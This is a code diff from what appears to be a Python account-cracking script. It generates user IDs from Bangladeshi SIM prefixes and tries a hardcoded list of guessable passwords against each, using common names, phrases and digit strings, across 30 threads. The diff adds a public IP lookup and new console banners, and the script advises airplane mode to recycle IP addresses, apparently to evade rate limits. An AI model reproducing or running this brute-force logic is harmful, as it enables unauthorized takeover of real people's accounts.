@@ -336,11 +336,14 @@ def num():
     with ThreadPool(max_workers=30) as yaari:
         os.system('clear')
         print(logo)
-		tl = str(len(user))
-		print(' TOTAL ACCOUNT :\033[1;92m '+tl)
-		print(f' \033[1;37mBD SIM CODE   :\033[1;92m {kode}\033[1;37m ')
-		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
-		print("  \x1b[1;96m--------------------------------------------------")
+        tl = str(len(user))
+        ip = requests.get("https://api.ipify.org").text
+       # jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
+        print(' \033[33;1m [+] TOTAL IDS:\033[38;5;45m '+tl)
+        print(' \033[33;1m [+] PROCESS HAS BEEN STARTED')
+        print(' \033[33;1m [!] WAIT FOR IDS ')
+        print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
+        print("  \x1b[1;96m--------------------------------------------------")
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
